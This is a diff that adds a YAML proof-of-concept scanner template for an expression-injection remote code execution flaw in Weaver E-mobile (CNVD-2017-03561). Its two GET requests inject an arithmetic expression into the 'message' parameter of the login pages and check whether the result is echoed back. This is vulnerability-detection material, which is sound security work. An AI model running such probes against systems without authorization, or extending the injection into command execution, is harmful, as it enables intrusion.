@@ -1,0 +1,30 @@
+name: yaml-poc-weaver-weaver_e_mobile-rce-CNVD-2017-03561
+binding: 6f0828c9-e0f4-48e9-a8d6-a919f6681cfd
+detail:
+    author: system_user
+    links:
+        - https://vul.wangan.com/a/CNVD-2017-03561
+    vulnerability:
+        id: 68b9449d-c0a9-415d-b450-6afe82768d0e
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /login.do?message={{r1}}*{{r2}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2))) && response.body.bcontains(b"Weaver E-mobile")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /manager/login.do?message={{r1}}*{{r2}}
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2))) && response.body.bcontains(b"Weaver E-mobile")
+expression: r0() || r1()
